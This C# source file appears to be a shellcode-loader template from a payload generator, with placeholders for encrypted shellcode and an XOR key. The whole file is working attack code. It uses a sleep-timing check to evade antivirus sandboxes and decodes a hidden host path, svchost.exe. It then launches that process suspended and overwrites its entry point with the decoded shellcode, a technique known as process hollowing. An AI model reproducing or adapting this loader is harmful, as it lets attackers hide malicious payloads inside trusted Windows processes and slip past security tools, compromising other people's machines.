using System;
using System.Runtime.InteropServices;

namespace ServiceHost {
   public class Program {
     public
     const uint CREATE_SUSPENDED = 0x4;
     public
     const int PROCESSBASICINFORMATION = 0;

     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
     public struct ProcessInfo {
       public IntPtr hProcess;
       public IntPtr hThread;
       public Int32 ProcessId;
       public Int32 ThreadId;
     }

     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
     public struct StartupInfo {
       public uint cb;
       public string lpReserved;
       public string lpDesktop;
       public string lpTitle;
       public uint dwX;
       public uint dwY;
       public uint dwXSize;
       public uint dwYSize;
       public uint dwXCountChars;
       public uint dwYCountChars;
       public uint dwFillAttribute;
       public uint dwFlags;
       public short wShowWindow;
       public short cbReserved2;
       public IntPtr lpReserved2;
       public IntPtr hStdInput;
       public IntPtr hStdOutput;
       public IntPtr hStdError;
     }

     [StructLayout(LayoutKind.Sequential)]
     internal struct ProcessBasicInfo {
       public IntPtr Reserved1;
       public IntPtr PebAddress;
       public IntPtr Reserved2;
       public IntPtr Reserved3;
       public IntPtr UniquePid;
       public IntPtr MoreReserved;
     }

     [DllImport("kernel32.dll")]
     static extern void Sleep(uint dwMilliseconds);

     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
     static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
       IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

     [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
     private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
       ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

     [DllImport("kernel32.dll", SetLastError = true)]
     static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
       int dwSize, out IntPtr lpNumberOfbytesRW);

     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
       Int32 nSize, out IntPtr lpNumberOfBytesWritten);

     [DllImport("kernel32.dll", SetLastError = true)]
     static extern uint ResumeThread(IntPtr hThread);

     public static void Main(string[] args) {
       // AV evasion: sleep 10s; if a sandbox fast-forwards, bail out
       DateTime t1 = DateTime.Now;
       Sleep(10000);
       double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
       if (deltaT < 9.5) {
         return;
       }

       // XOR-encoded shellcode (key randomized per build)
       {encrypted_shellcode}

       // Decode payload at runtime
       for (int i = 0; i < buf.Length; i++) {
         buf[i] = (byte)(buf[i] ^ {xor_key});
       }

       // Resolve host process path at runtime (XOR-obfuscated string)
       byte[] hp = new byte[] { 0x01, 0x78, 0x1E, 0x15, 0x2B, 0x2C, 0x26, 0x2D, 0x35, 0x31, 0x1E, 0x11, 0x3B, 0x31, 0x36, 0x27, 0x2F, 0x71, 0x70, 0x1E, 0x31, 0x34, 0x21, 0x2A, 0x2D, 0x31, 0x36, 0x6C, 0x27, 0x3A, 0x27 };
       for (int q = 0; q < hp.Length; q++) hp[q] ^= 0x42;
       string hostPath = System.Text.Encoding.ASCII.GetString(hp);

       // Start host process suspended
       StartupInfo sInfo = new StartupInfo();
       sInfo.cb = (uint) Marshal.SizeOf(typeof (StartupInfo));
       ProcessInfo pInfo = new ProcessInfo();
       CreateProcess(null, hostPath, IntPtr.Zero, IntPtr.Zero,
         false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);

       // Get PEB; ImageBaseAddress lives at PEB+0x10 on x64
       ProcessBasicInfo pbInfo = new ProcessBasicInfo();
       uint retLen = 0;
       ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo,
         (uint)(IntPtr.Size * 6), ref retLen);
       IntPtr baseImageAddr = (IntPtr)((Int64) pbInfo.PebAddress + 0x10);

       // Read ImageBaseAddress, then the first 0x200 bytes of the PE
       byte[] procAddr = new byte[0x8];
       byte[] dataBuf = new byte[0x200];
       IntPtr bytesRW;
       ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
       IntPtr executableAddress = (IntPtr) BitConverter.ToInt64(procAddr, 0);
       ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);

       // e_lfanew at 0x3C -> PE header; AddressOfEntryPoint is PE+0x28
       uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
       uint rvaOffset = e_lfanew + 0x28;
       uint rva = BitConverter.ToUInt32(dataBuf, (int) rvaOffset);
       IntPtr entrypointAddr = (IntPtr)((Int64) executableAddress + rva);

       // Hijack the entrypoint with decoded shellcode and resume
       WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
       ResumeThread(pInfo.hThread);
     }
   }
 }